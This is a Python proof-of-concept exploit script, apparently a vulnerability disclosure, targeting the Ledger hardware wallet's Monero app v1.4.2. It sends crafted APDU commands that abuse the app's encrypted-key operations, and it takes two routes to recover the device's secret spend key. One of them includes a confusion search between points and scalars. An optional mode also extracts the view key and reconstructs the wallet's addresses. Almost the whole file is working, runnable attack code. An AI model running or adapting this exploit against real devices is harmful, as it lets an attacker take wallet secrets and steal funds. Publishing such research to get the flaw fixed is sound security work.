# Ledger app Monero v1.4.2 PoC, spend key extraction
# pip install ledgerblue monero_agent
# @author: ph4r05

import binascii
import argparse
from ledgerblue.comm import getDongle
from ledgerblue.commException import CommException
from monero_glue.xmr import crypto
from monero_glue.xmr.sub import addr, xmr_net

MONERO_VER = b'0.15.0.1'

# binascii.hexlify(crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(1))))
PT_BASE = binascii.unhexlify(b'5866666666666666666666666666666666666666666666666666666666666666')

# binascii.hexlify(crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(0))))
PT_IDENT = binascii.unhexlify(b'0100000000000000000000000000000000000000000000000000000000000000')

# CLS | INS | P1 | P2 | LC | OPT
# dongle = getDongle(False)  # debug flag


def ksize(x):
    return sum(len(y) for y in x) if isinstance(x, (list, tuple)) else len(x)


class PoC:
    def __init__(self, dongle, lite=True):
        self.args = None
        self.dongle = dongle
        self.tx_open = False
        self.r = None
        self.fake_a = None
        self.fake_b = None
        self.lite = lite
        self.apdus = []
        self.commands = []

    def ksize(self):
        return 64 if self.tx_open else 32

    def serkey(self, x):
        return bytearray(x[0] + x[1]) if self.tx_open else x[0]

    def fmtkey(self, x):
        return binascii.hexlify(x[0])

    def apdu(self, ins, p1=0, p2=0, opt=0, body=None):
        body = [] if not body else body
        return bytearray([0x02, ins, p1, p2, 1+len(body), opt]) + bytearray(body)

    def exchange(self, apdu, cmd=None):
        self.apdus.append(apdu)
        self.commands.append(cmd)
        return self.dongle.exchange(apdu)

    def gen_kp(self):
        r = self.exchange(self.apdu(0x40), 'gen_keypair()')
        pub = r[0:32]
        sec = r[32:64], r[64:]
        return pub, sec

    def reset(self):
        r = self.exchange(self.apdu(0x02, body=bytearray(list(MONERO_VER))), 'reset')
        self.tx_open = False
        return r

    def open_tx(self):
        r = self.exchange(self.apdu(0x70, body=bytearray([0, 0, 0, 0])), 'open_tx')
        self.r = (r[1*32:2*32], r[2*32:3*32])
        self.fake_a = (r[3*32:4*32], r[4*32:5*32])
        self.fake_b = (r[5*32:6*32], r[6*32:7*32])
        self.tx_open = True

    def set_mode(self, fake=False):
        r = self.exchange(self.apdu(0x72, p1=1, body=bytearray([2 if fake else 1])), 'set_mode')
        return r

    def sc_sub(self, a, b):
        r = self.exchange(self.apdu(0x3E, body=self.serkey(a) + self.serkey(b)), 'sc_sub')
        return r[:32], r[32:]

    def sc_add(self, a, b):
        r = self.exchange(self.apdu(0x3C, body=self.serkey(a) + self.serkey(b)), 'sc_add')
        return r[:32], r[32:]

    def gen_derivation(self, pub, sec):
        r = self.exchange(self.apdu(0x32, body=pub + self.serkey(sec)), 'gen_derivation')
        return r[:32], r[32:]

    def derive_secret_key(self, deriv, idx, key):
        if idx != 0: raise ValueError('Not supported now')
        r = self.exchange(self.apdu(0x38, body=self.serkey(deriv) + bytearray([0, 0, 0, 0]) + self.serkey(key)),
                          'derive_secret_key')
        return r[:32], r[32:]

    def mlsag_sign_s(self, xx, alpha):
        r = self.exchange(self.apdu(0x7E, p1=0x03, p2=1, body=self.serkey(xx) + self.serkey(alpha)), 'mlsag_sign')
        return r[:32], None

    def mlsag_hash(self, msg=None, opt=0x00):  # monero_apdu_mlsag_hash
        c = self.exchange(self.apdu(0x7E, p1=0x02, p2=0 if msg else 1, opt=opt, body=msg if msg else []), 'mlsag_hash')
        return c

    def get_subaddress_secret_key(self, sec, index=None):
        r = self.exchange(self.apdu(0x4C, body=self.serkey(sec) + bytearray([0]*8)), 'get_subaddress_secret_key')
        return r[:32], r[32:]

    def scalarmult(self, sec, pub=PT_BASE):
        r = self.exchange(self.apdu(0x42, body=pub + self.serkey(sec)), 'scalarmult')
        return r[:32]

    def poc(self):
        print('[+] PoC Ledger-app-Monero 1.4.2 spend key extraction')
        self.reset()
        self.set_mode()
        self.open_tx()

        # 1. call `monero_apdu_generate_keypair()`, obtain `{enc(x), hmac(enx(x))}`, where `x` is unknown.
        _, sec = self.gen_kp()
        print('  1. rsec: %s' % self.fmtkey(sec).decode('ascii'))

        # 2. call `sc_sub(enc(x), hmac(enc(x)), enc(x), hmac(enc(x)))`, obtain `{enc(0), hmac(enc(0))}`
        zero = self.sc_sub(sec, sec)
        print('  2. zero: %s' % self.fmtkey(zero).decode('ascii'))

        # 3. call `monero_apdu_derive_secret_key(
        #             enc(0), hmac(enc(0)), 0, C_FAKE_SEC_SPEND_KEY, hmac(C_FAKE_SEC_SPEND_KEY))`,
        #    obtain `{enc(r), hmac(enc(r))}`
        encr = self.derive_secret_key(zero, 0, self.fake_b)
        print('  3. encr: %s' % self.fmtkey(encr).decode('ascii'))

        # 4. call `monero_apdu_mlsag_sign(enc(0), hmac(enc(0)), enc(r), hmac(enc(r)))`, obtain `r`
        r = self.mlsag_sign_s(zero, encr)
        print('  4. r:  %s' % self.fmtkey(r).decode('ascii'))

        # 5. compute b: `b = r - H_s(00....00 || varint(0))`
        hs0 = crypto.hash_to_scalar(bytearray(33))
        rsc = crypto.decodeint(r[0])
        bsc = crypto.sc_sub(rsc, hs0)
        b = crypto.encodeint(bsc)
        print('  5. b:  %s' % binascii.hexlify(b).decode('ascii'))

        B = crypto.scalarmult_base(bsc)
        print('  5. B:  %s' % binascii.hexlify(crypto.encodepoint(B)).decode('ascii'))

        # 6. Verify
        BB = self.scalarmult(self.fake_b)
        print('  6. bG: %s' % binascii.hexlify(BB).decode('ascii'))

        if BB == crypto.encodepoint(B):
            print('[+] PoC successful')
        else:
            print('[-] PoC not working')

        if self.lite:
            return

        self.extra_poc(zero, hs0, B)

    def extra_poc(self, zero, hs0, B):
        #  --- Extra ---
        # Extract view key and address reconstruction.
        # Not needed for the PoC
        print('\nExtracting view-key...')
        encr = self.derive_secret_key(zero, 0, self.fake_a)
        r = self.mlsag_sign_s(zero, encr)
        rsc = crypto.decodeint(r[0])
        asc = crypto.sc_sub(rsc, hs0)
        a = crypto.encodeint(asc)
        print('  a:  %s' % binascii.hexlify(a).decode('ascii'))

        A = crypto.scalarmult_base(asc)
        print('  A:  %s' % binascii.hexlify(crypto.encodepoint(A)).decode('ascii'))

        AA = self.scalarmult(self.fake_a)
        print('  aG: %s' % binascii.hexlify(AA).decode('ascii'))

        main_addr = addr.encode_addr(
            xmr_net.net_version(xmr_net.NetworkTypes.MAINNET),
            crypto.encodepoint(B),
            crypto.encodepoint(A),
        )

        test_addr = addr.encode_addr(
            xmr_net.net_version(xmr_net.NetworkTypes.TESTNET),
            crypto.encodepoint(B),
            crypto.encodepoint(A),
        )

        print('Mainnet address: %s' % main_addr.decode('ascii'))
        print('Testnet address: %s' % test_addr.decode('ascii'))

    def find_confusion(self, A, N=10000):
        """find x, s.t.: [8*x*A]_pt == [8*x*A]_sc"""
        for i in range(1, N):
            Ac = crypto.scalarmult(A, crypto.sc_init(i*8))
            Ab = crypto.encodepoint(Ac)
            red = crypto.encodeint(crypto.decodeint(Ab))
            if red == Ab:
                return i, Ab
        raise ValueError('Could not find a confusion parameter!')

    def poc2(self):
        print('[+] PoC Ledger-app-Monero 1.4.2 spend key extraction, v2')
        self.reset()
        self.set_mode()
        self.open_tx()

        # 1. get A, find x, s.t.: [8*a*x*G]_pt == [8*a*x*G]_sc
        A = self.scalarmult(self.fake_a)
        Apt = crypto.decodepoint(A)
        x, A8x = self.find_confusion(Apt)
        Gx = crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(x)))

        print('  1. Confusion found, x: %d' % (x,))
        print('     8xA:  %s' % binascii.hexlify(A8x).decode('ascii'))
        print('       A:  %s' % binascii.hexlify(A).decode('ascii'))
        print('      xG:  %s' % binascii.hexlify(Gx).decode('ascii'))

        # 2. gen_deriv (8*a*x*G) = enc(8x*A) = enc(P); we know {P, enc(P)};
        # It holds that P=8xA is also a valid scalar value, from the step above.
        P = self.gen_derivation(Gx, self.fake_a)
        print('  2.   P:  %s' % (self.fmtkey(P).decode('ascii'),))

        # 3. get_secret_key: s1 = Hs(P||0) + s
        sp = self.derive_secret_key(P, 0, self.fake_b)
        print('  3.   sp: %s' % (self.fmtkey(sp).decode('ascii'),))

        # 4. mlsag_hash(p2=1, opt=0x80) = c
        c = self.mlsag_hash()
        print('  4.   c:  %s' % (binascii.hexlify(c).decode('ascii'),))

        # 5. mlsag_sign(s1, enc(P)), r1 = enc(s1 - Pc) = enc(Hs(P||0) + s - Pc);
        # We have R = Hs(P||0) + s - Pc -> R - Hs(P||0) + Pc = s
        r = self.mlsag_sign_s(P, sp)
        print('  5.   r:  %s' % (binascii.hexlify(r[0]).decode('ascii'),))

        # Extract the spend key
        hs0 = crypto.hash_to_scalar(bytearray(A8x) + bytearray(1))
        rsc = crypto.decodeint(r[0])
        rsc = crypto.sc_sub(rsc, hs0)
        bsc = crypto.sc_add(rsc, crypto.sc_mul(crypto.decodeint(c), crypto.decodeint(A8x)))
        b = crypto.encodeint(bsc)
        print('  5.   b:  %s' % binascii.hexlify(b).decode('ascii'))

        B = crypto.scalarmult_base(bsc)
        print('  5.   B:  %s' % binascii.hexlify(crypto.encodepoint(B)).decode('ascii'))

        # 6. Verify
        BB = self.scalarmult(self.fake_b)
        print('  6.   bG: %s\n' % binascii.hexlify(BB).decode('ascii'))

        if BB == crypto.encodepoint(B):
            print('[+] PoC successful')
        else:
            print('[-] PoC not working')

        print('\nCommands: ')
        for x in self.commands:
            print('  %s' % x)

    def main(self):
        parser = argparse.ArgumentParser(description='Ledger Monero App 1.4.2 spend key extraction demo')
        parser.add_argument('--poc1', dest='poc1', action='store_const', const=True, default=False,
                            help='PoC with sc_sub')
        parser.add_argument('--poc2', dest='poc2', action='store_const', const=True, default=False,
                            help='PoC with sc_sub')
        parser.add_argument('--extra', dest='extra', action='store_const', const=True, default=False,
                            help='PoC 1 with extra address extraction')
        self.args, unparsed = parser.parse_known_args()
        self.lite = not self.args.extra
        if self.args.poc1:
            self.poc()

        if self.args.poc2 or (not self.args.poc1 and not self.args.poc2):
            self.poc2()


def main():
    dongle = getDongle(False)
    poc = PoC(dongle, True)
    poc.main()


if __name__ == '__main__':
    main()
